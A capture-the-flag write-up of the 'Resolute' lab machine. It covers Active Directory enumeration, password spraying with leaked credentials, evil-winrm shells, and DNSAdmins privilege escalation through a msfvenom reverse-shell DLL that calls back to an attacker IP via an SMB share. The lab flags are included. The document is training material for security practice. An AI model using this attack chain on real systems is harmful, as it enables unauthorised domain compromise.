# Resolute - Medium

```shell
sudo vim /etc/hosts
#add resolute.htb

nmap -T4 -p- -A -Pn -v 10.10.10.169

crackmapexec smb 10.10.10.169
#this also shows host name and domain name

smbclient -L \\\\10.10.10.169
#no output

smbmap -H 10.10.10.169
#no output

rpcclient -U "" -N 10.10.10.169
#for enumeration

#in rpcclient
enumdomusers
#get usernames

enumdomgroups
#get group names

vim users.txt
#copy usernames

enum4linux 10.10.10.169
#get valid users
#for one user, this shows password in description

vim pass.txt
#add the password

crackmapexec smb -u users.txt -p pass.txt --shares 10.10.10.169 --continue-on-success
#this shows the password is valid for user 'melanie'

evil-winrm -u "melanie" -p "Welcome123\!" -i 10.10.10.169
#we get shell

#get user flag from melanie Desktop

#for enumeration
upload /home/sv/Tools/winPEASx64.exe

.\winPEASx64.exe
#go through output

upload /home/sv/Tools/SharpHound.exe

.\SharpHound.exe

#download zip file generated
download C:\Users\melanie\20221227053134_BloodHound.zip /home/sv/resolute.zip

#in attacker machine
#run neo4j and bloodhound
sudo neo4j console

cd /opt/BloodHound/BloodHound-linux-x64

./BloodHound --no-sandbox
#open the .zip file in BloodHound
#check for privesc

#manual enumeration
#in evil-winrm session
cd C:\

#check hidden directories as well
gci -force
#shows hidden folder

cd PSTranscripts

gci -force
#this shows another folder

cd 20191203

gci -force
#we have a file, we can go through it
#this file contains a potential password for 'ryan'

#on attacker machine
evil-winrm -u ryan -p "Serv3r4Admin4cc123\!" -i 10.10.10.169
#we get shell as ryan

type C:\Users\ryan\Desktop\note.txt
#this shows that system changes will be regularly reverted

whoami /groups
#shows that we are a part of Contractors & DNSAdmins groups

#follow DNSAdmins dll exploit

#on attacker machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f dll > sv.dll
#generates DLL payload

nc -nvlp 4444
#setup listener

smbserver.py share .
#start smb server

#in evil-winrm session as ryan
dnscmd.exe /config /serverlevelplugindll \\10.10.14.2\share\sv.dll
#executes payload

sc.exe \\resolute stop dns
#stops dns service

sc.exe \\resolute start dns
#starts dns service
#this gives us shell on our listener

#in reverse shell
whoami
#system user
```

* Open ports & services:

  * 53 - domain - Simple DNS Plus
  * 88 - kerberos-sec - Kerberos
  * 135 - msrpc - RPC
  * 139 - netbios-ssn - netbios-ssn
  * 389 - ldap - AD LDAP
  * 445 - microsoft-ds - Windows Server 2016 Standard 14393 microsoft-ds
  * 593 - ncacn_http - RPC over HTTP 1.0
  * 3268 - ldap - AD LDAP
  * 5985 - http - HTTPAPI httpd 2.0
  * 9389 - mc-nmf - .NET Message Framing
  * 47001 - http - HTTPAPI httpd 2.0
  * 49664 - msrpc - RPC

* ```nmap``` gives us the domain 'megabank.local'.

* We can get host and domain name using ```crackmapexec``` as well.

* We can attempt enumeration of SMB shares using ```smbclient``` and ```smbmap``` but we do not get anything.

* For further enumeration, we can use ```rpcclient``` and its built-in functions like ```enumdomusers``` and ```enumdomgroups``` to enumerate users and groups on the machine.

* We can copy the list of usernames, clean it up and write it to a file - we now have a list of valid users.

* Similarly, we can try using ```enum4linux``` - this also gives us a list of usernames.

* Also, in the ```enum4linux``` output, in the description for the account of Marko Novak, the password is disclosed in cleartext.

* So, we now have the password 'Welcome123!' for user 'marko'; we can try to check if this password is legit using ```crackmapexec```.

* This shows that the password found is valid for user 'melanie' - now we can login using ```evil-winrm```.

* After getting shell, we can get the user flag from melanie's Desktop.

* For enumeration, we can try using ```winpeas``` - this can be transferred to the victim session using 'upload' and 'download' commands in ```evil-winrm```.

* By running ```winpeas```, we do not get a lot of pointers for privesc.

* As we know that this is an Active Directory environment, we can try to upload ```SharpHound``` and run it.

* As a result, a .zip file is generated; we can download this and view it on attacker machine using ```bloodhound```.

* In the GUI, we can mark the node for user Melanie as Owned; using the pre-built analytic queries, we now need to find privesc routes.

* We can try to go through all of the queries, but we do not get any significant privesc route yet.

* So, we can go back to enumerating the machine manually to check for privesc.

* Now, we can list hidden files in PowerShell using the ```force``` flag, when used with ```Get-ChildItem```.

* Using this in the C:\ directory, we can see that there is a hidden folder 'PSTranscripts'.

* Using ```gci -force```, we eventually get a PowerShell transcript file; we can go through this.

* Now, this file contains a cleartext password "Serv3r4Admin4cc123!" for the user 'ryan'.

* Using ```evil-winrm```, we are able to get a shell as 'ryan' now.

* Now, there is a .txt file on ryan's Desktop - this reads that any system changes (except those related to Administrator account) will be reverted within a minute.

* We can continue our enumeration here; on ```bloodhound``` we can now mark 'ryan' as Owned.

* We can also see that we are a part of "Contractors" and "DNSAdmins" groups.

* After Googling for exploits related to DNSAdmins group, we can see that members of this group can run DLL files with elevated privileges.

* To exploit this privilege, we need to craft a malicious DLL file; for which we can use ```msfvenom```.

* Following the exploit steps, after creating the payload, we need to host a SMB server to share the file (instead of directly uploading it to victim machine).

* After setting up our listener, we can execute the crafted DLL payload using ```dnscmd.exe```.

* Then, we need to stop and restart the 'dns' service, keeping in mind that every minute the changes would be reset.

* Once we start the 'dns' service, we get a shell on our listener as Administrator; we can now read the root flag.

```markdown
1. User flag - f216624f6e8c4eab3d558fa0912c3146

2. Root flag - d8a23969e294b64bfe8c81926438ff6e
```
